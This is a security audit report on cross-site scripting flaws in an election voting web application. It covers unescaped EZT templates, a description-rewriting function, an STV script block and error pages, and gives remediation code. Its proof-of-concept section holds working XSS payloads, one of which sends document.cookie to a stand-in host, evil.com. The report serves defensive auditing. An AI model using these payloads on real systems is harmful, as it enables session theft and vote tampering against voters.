## Findings

### Critical Severity

#### ASVS-135-CRI-001: Stored XSS — `rewrite_description()` Builds Raw HTML From Unsanitized User Input

**Severity:** CRITICAL

**Location:**
- **File:** `v3/server/pages.py`
- **Function:** `rewrite_description()`
- **Lines:** 39–48

**Related Functions:**
- Called by: `vote_on_page()` (pages.py, lines ~325–326)
- Rendered in: `v3/server/templates/vote-on.ezt`

**Description:**

The `rewrite_description()` function converts user-supplied issue descriptions into HTML without sanitization. It wraps descriptions in `<pre>` tags and converts `doc:filename` patterns into clickable links. This raw HTML is then rendered directly in EZT templates without escaping, creating a stored XSS vulnerability.

**Vulnerable Code:**

```python
def rewrite_description(issue):
    """Rewrite issue description: wrap in <pre> and convert doc:filename to links."""
    import re
    desc = issue.description  # User-supplied, stored in DB
    def repl(match):
        filename = match.group(1)
        return f'<a href="/docs/{issue.iid}/{filename}">{filename}</a>'
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'  # Raw HTML from user input
```

**Data Flow:**

1. **Source:** Election admin submits issue description via `POST /do-add-issue/<eid>` or `POST /do-edit-issue/<eid>/<iid>` (form field `description`)
2. **Storage:** Description stored in SQLite `issue` table via parameterized query
3. **Processing:** `rewrite_description()` wraps raw description in `<pre>` HTML tags
4. **Sink:** EZT renders `[issues.description]` without HTML escaping (EZT default is no escaping)
5. **Missing control:** No HTML sanitization, no `[format "html"]` applied

Template rendering in `vote-on.ezt`:
```html
<div id="description-[issues.iid]" class="description mt-2 text-muted small">
  [issues.description]
</div>
```

**Proof of Concept:**

A committer creates an issue with description:
```html
<img src=x onerror="fetch('/do-vote/'+document.querySelector('[name=csrf_token]').value,{method:'POST'})">
```

Or via the `doc:` link rewriting (attribute injection):
```
doc:x"onmouseover="alert(document.cookie)"y
```

This produces: `<a href="/docs/IID/x" onmouseover="alert(document.cookie)" y="">...`

When any voter visits `/vote-on/<eid>`, the JavaScript executes in their browser session.

**Impact:**

Any authenticated committer can inject persistent XSS that executes for ALL voters viewing the election. This can:
- Steal session tokens
- Submit votes on behalf of victims
- Exfiltrate ballot choices
- Perform unauthorized actions using victim credentials

**Remediation:**

```python
import html

def rewrite_description(issue):
    """Rewrite issue description safely."""
    desc = html.escape(issue.description or '')
    
    def repl(match):
        filename = html.escape(match.group(1))
        return f'<a href="/docs/{html.escape(issue.iid)}/{filename}">{filename}</a>'
    
    desc = re.sub(r'doc:([^\s]+)', repl, desc)
    issue.description = f'<pre>{desc}</pre>'
```

### High Severity

#### ASVS-135-HIG-001: Stored XSS — Systematic Lack of Output Encoding in EZT Templates

**Severity:** HIGH

**Location:**
- **Files:** Multiple EZT templates (manage.ezt, voter.ezt, admin.ezt, flashes.ezt)
- **Lines:** Various

**Related Functions:**
- `flash_success()` in pages.py (line ~490)
- `election.get_metadata()`, `election.list_issues()`
- Template rendering in multiple `.ezt` files

**Description:**

The application systematically fails to apply HTML output encoding to user-controlled data in EZT templates. The `[format "html"]` directive exists in EZT but is not applied to user-supplied values rendered in HTML body contexts. This is a Type B gap — the same codebase correctly uses `[format "js,html"]` in onclick attributes, proving awareness of the mechanism, but fails to apply it consistently.

**Vulnerable Code Examples:**

`v3/server/templates/manage.ezt`:
```html
<strong>[issues.title]</strong>
...
<div id="description-[issues.iid]" class="description mt-2">[issues.description]</div>
```

`v3/server/templates/voter.ezt`:
```html
<h5 class="card-title mb-3">[open_elections.title]</h5>
...
<span>[open_elections.authz] can vote</span>
...
Created By [open_elections.owner_name]
```

`v3/server/templates/admin.ezt`:
```html
<h5 class="card-title">[owned.title]</h5>
...
Created by [owned.owner_name] ([owned.owner_pid])
...
(authz: [owned.authz])
```

`v3/server/templates/flashes.ezt`:
```html
<div class="alert alert-[flashes.category] ...">
    [flashes.message]
```

**Data Flow (flash messages):**

1. **Source:** `form.title` from `POST /do-create-election` (pages.py line ~489)
2. **Processing:** `pages.py` line 490: `await flash_success(f'Created election: {form.title}')`
3. **Sink:** `flashes.ezt` renders `[flashes.message]` without encoding

**Data Flow (election/issue titles):**

1. **Source:** Form submissions for elections/issues
2. **Storage:** SQLite database
3. **Retrieval:** `election.get_metadata()`, `election.list_issues()`
4. **Sink:** Multiple templates render `[*.title]`, `[*.description]`, `[*.authz]` without `[format "html"]`

**Note:** The same codebase uses `[format "js,html"]` in manage.ezt/manage-stv.ezt for onclick attributes:
```html
onclick="openEditIssueModal('[issues.iid]',
                            '[format "js,html"][issues.title][end]',
                            '[format "js,html"][issues.description][end]')"
```

This proves awareness of the escaping mechanism, but it is only applied in JavaScript attribute contexts—not in HTML body contexts where user data is also rendered.

**Proof of Concept:**

Admin creates election with title:
```html
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

This title is rendered unescaped on:
- The admin's own admin page (`admin.ezt`)
- Every voter's voter page (`voter.ezt`)
- The management page (`manage.ezt`)
- The voting page header (`vote-on.ezt`)

**Impact:**

Stored XSS affecting all users who view elections or issues containing malicious content. Allows:
- Session hijacking
- Unauthorized vote manipulation
- Data exfiltration
- Privilege escalation

**Remediation:**

Apply `[format "html"]` to ALL user-supplied values in EZT templates:

```html
<!-- Before -->
<h5 class="card-title">[owned.title]</h5>

<!-- After -->
<h5 class="card-title">[format "html"][owned.title][end]</h5>
```

Alternatively, configure asfquart/EZT to use HTML escaping by default and require explicit `[format "raw"]` for pre-sanitized HTML.

#### ASVS-135-HIG-002: JavaScript Injection via Server-Side Template Rendering in vote-on.ezt Script Block

**Severity:** HIGH

**Location:**
- **File:** `v3/server/templates/vote-on.ezt`
- **Section:** JavaScript block near bottom of template

**Related Functions:**
- `vote_on_page()` in pages.py
- Issue retrieval and candidate data unpacking

**Description:**

User-controlled data (issue titles, candidate labels and names) is inserted directly into JavaScript string literals without proper escaping. This is a Type B gap — the same file defines a client-side `escapeHtml()` function that is used for DOM manipulation, but the injection occurs at the server-side template level BEFORE the JavaScript executes, bypassing the client-side protection.

**Vulnerable Code:**

```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[issues.iid]": {
      seats: [issues.seats],
      title: "[issues.title]",
      candidates: [
[for issues.candidates]        { label: "[issues.candidates.label]", name: "[issues.candidates.name]" },
[end]      ]
    },
[end][end]  };
```

**Key Type B evidence — the same file defines a client-side escape function:**

```javascript
function escapeHtml(s) {
    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
            .replace(/"/g,'&quot;');
}
```

This function is called when building DOM elements (`makeItem()`), but the injection occurs at the server-side template level BEFORE the JavaScript even executes.

**Data Flow:**

1. **Source:** STV issue title set via `POST /do-add-issue/<eid>` or YAML import; candidate labels/names from issue KV data
2. **Storage:** Database `issue` table, `kv` column (JSON)
3. **Retrieval:** `pages.py` `vote_on_page()` unpacks `issue.kv.labelmap`
4. **Sink:** EZT inserts values directly into JavaScript string literals without `[format "js"]`

**Proof of Concept:**

Create STV issue with title:
```
Board Election", candidates: []}, "evil": { seats: 0, title: "x
```

Or a candidate name containing:
```
Alice"+alert(document.cookie)+"
```

When any voter opens the STV election page, the injected JavaScript executes.

**Impact:**

Arbitrary JavaScript execution in voters' browsers when viewing STV election pages. An admin who controls issue/candidate data can execute code in every voter's session, leading to:
- Session token theft
- Vote manipulation
- Data exfiltration
- Account compromise

**Remediation:**

Use `[format "js"]` for JavaScript string contexts:

```javascript
const STV_CANDIDATES = {
[for issues][is issues.vtype "stv"]    "[format "js"][issues.iid][end]": {
      seats: [issues.seats],
      title: "[format "js"][issues.title][end]",
      candidates: [
[for issues.candidates]        { label: "[format "js"][issues.candidates.label][end]", name: "[format "js"][issues.candidates.name][end]" },
[end]      ]
    },
[end][end]  };
```

### Medium Severity

#### ASVS-135-MED-001: Reflected XSS via Error Templates Displaying URL-Derived Identifiers

**Severity:** MEDIUM

**Location:**
- **Files:** `v3/server/templates/e_bad_eid.ezt`, `e_bad_iid.ezt`, `e_bad_pid.ezt`
- **Function:** `load_election()` decorator in pages.py
- **Lines:** pages.py ~142–153

**Related Functions:**
- `load_election()` decorator
- Error handling in various route handlers

**Description:**

Error templates display URL-derived identifiers (election IDs, issue IDs, person IDs) without HTML encoding. When an invalid ID is provided in the URL, it is extracted and rendered directly in the error page, creating a reflected XSS vulnerability.

**Vulnerable Code:**

`e_bad_eid.ezt`:
```html
The Election ID ([eid]) does not exist,
```

`e_bad_iid.ezt`:
```html
The Issue ID ([iid]) does not exist,
```

**Data Flow:**

1. **Source:** URL path parameter, e.g., `GET /vote-on/<eid>` or `GET /manage/<eid>/<iid>`
2. **Processing:** `pages.py` `load_election()` decorator, line ~148: `result.eid = eid`
3. **Sink:** Error template renders `[eid]` without HTML encoding

Code in `pages.py` `load_election()` decorator (line ~142–153):

```python
async def loader(eid):
    try:
        e = steve.election.Election(DB_FNAME, eid)
    except steve.election.ElectionNotFound:
        result = await basic_info()
        result.title = 'Unknown Election'
        result.eid = eid  # URL parameter passed directly to template
        raise_404(T_BAD_EID, result)
```

**Proof of Concept:**

```
GET /vote-on/%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E HTTP/1.1
```

Decoded EID: `<img src=x onerror=alert(1)>` is rendered in the 404 error page.

**Impact:**

Reflected XSS via crafted URLs. Requires social engineering to deliver the malicious link to a victim. Limited to error page context but can still be used for:
- Session token theft
- Phishing attacks
- Credential harvesting

**Remediation:**

Apply HTML encoding to all error template variables:

```html
The Election ID ([format "html"][eid][end]) does not exist,
```

Apply the same fix to all error templates (`e_bad_eid.ezt`, `e_bad_iid.ezt`, `e_bad_pid.ezt`).

## Architecture Observations

1. **EZT Templating Engine Default Behavior**: EZT does NOT perform HTML escaping by default. Values inserted via `[variable]` are rendered as-is. This is a dangerous default for a web application. The application inconsistently applies `[format "html"]` or `[format "js,html"]` — proving the developers know the mechanism exists but haven't applied it systematically.

2. **rewrite_description() Anti-Pattern**: This function converts user-supplied plain text into HTML (wrapping in `<pre>`, creating `<a>` links) without any sanitization step. It should either: (a) HTML-escape the description first, then apply link transformations, or (b) use a proper sanitization library (e.g., `bleach`) to allow only safe HTML.

3. **Mixing Raw HTML Generation with Template Rendering**: The pattern of generating HTML in Python (e.g., `f'<pre>{desc}</pre>'`) and passing it to EZT templates creates confusion about whether the template should escape the value. A cleaner architecture would keep HTML generation in templates and pass only data.

4. **Inconsistent Security Controls**: The codebase demonstrates knowledge of proper escaping techniques (e.g., `[format "js,html"]` in onclick attributes, client-side `escapeHtml()` function) but fails to apply them systematically. This suggests a lack of security review process or coding standards enforcement.

## Recommendations Summary

### Immediate Actions

1. **Apply `[format "html"]` to all user-supplied data in EZT templates**: Audit every `.ezt` file and wrap all user-derived values (`title`, `description`, `name`, `authz`, `eid`, `iid`, `pid`, `message`) in `[format "html"]...[end]`. For JavaScript contexts, use `[format "js"]`.

2. **Sanitize `rewrite_description()`**: HTML-escape the description BEFORE performing regex substitutions and wrapping in HTML tags. Use `html.escape()` on the raw description text, then apply the `doc:` link transformation.

### Short-Term Actions

3. **Establish a default-escape policy**: Configure or wrap the EZT template system so that all values are HTML-escaped by default, requiring explicit opt-out (`[format "raw"]`) for pre-sanitized HTML. This prevents future regressions.

4. **Add Content-Security-Policy header**: Implement a strict CSP (`script-src 'self'`) to mitigate XSS impact even if encoding is missed. This provides defense-in-depth.

5. **Conduct security code review training**: Ensure all developers understand output encoding requirements and the risks of rendering unsanitized user input.

### Long-Term Actions

6. **Consider a templating engine with auto-escaping**: EZT's default-raw behavior is inherently risky. Migrating to a templating engine with auto-escaping by default (e.g., Jinja2 with autoescape=True) would eliminate this entire class of vulnerability.

7. **Implement automated security testing**: Add SAST/DAST tools to the CI/CD pipeline to catch output encoding issues before deployment.

8. **Establish secure coding standards**: Document and enforce standards for output encoding, input validation, and HTML generation patterns.
